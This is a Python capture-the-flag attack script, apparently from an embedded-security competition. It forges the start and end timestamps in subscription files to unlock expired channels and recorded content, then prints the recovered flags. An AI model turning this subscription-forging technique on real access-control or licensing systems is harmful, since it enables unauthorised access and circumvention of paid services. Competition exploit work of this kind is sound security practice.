#!/usr/bin/env python3
# forge subscrption timestamp
# for expired and recording scenarios

import os

from attack_utils import LimitedAttackTV, conn, p64, recording_playback, run_attack


def forge_timestamp(subscription, channel):
    _, start, end = channel
    start_offset = subscription.index(p64(start))
    end_offset = subscription.index(p64(end))
    print(f"found offset start {start_offset} end {end_offset}")

    new_subscription = bytearray(subscription)
    new_subscription[start_offset : start_offset + 8] = p64(0)
    new_subscription[end_offset : end_offset + 8] = p64(2**63 - 1)

    return new_subscription


async def main():
    r = conn()
    listing = r.list()

    channel_1 = next(c for c in listing if c[0] == 1)
    channel_2 = next(c for c in listing if c[0] == 2)

    with open("../test_out/own.sub", "rb") as f:
        channel_1_sub = f.read()

    with open("../test_out/expired.sub", "rb") as f:
        channel_2_sub = f.read()
    try:
        r.subscribe(forge_timestamp(channel_1_sub, channel_1))
        r.subscribe(forge_timestamp(channel_2_sub, channel_2))
    except ValueError:
        print("couldn't find timestamp offset")
        return

    flag = await recording_playback()
    if flag:
        print(f"POTENTIAL FLAG: ectf{{recording_{flag}}}")

    tv = LimitedAttackTV(
        os.environ["IP"],
        int(os.environ[f"CHANNEL_1_PORT"]),
        "/dev/ttyACM0",
        115200,
    )
    tv.run()

    if tv.flag:
        print(f"POTENTIAL FLAG: ectf{{expired_{tv.flag}}}")


if __name__ == "__main__":
    run_attack(main, 30)
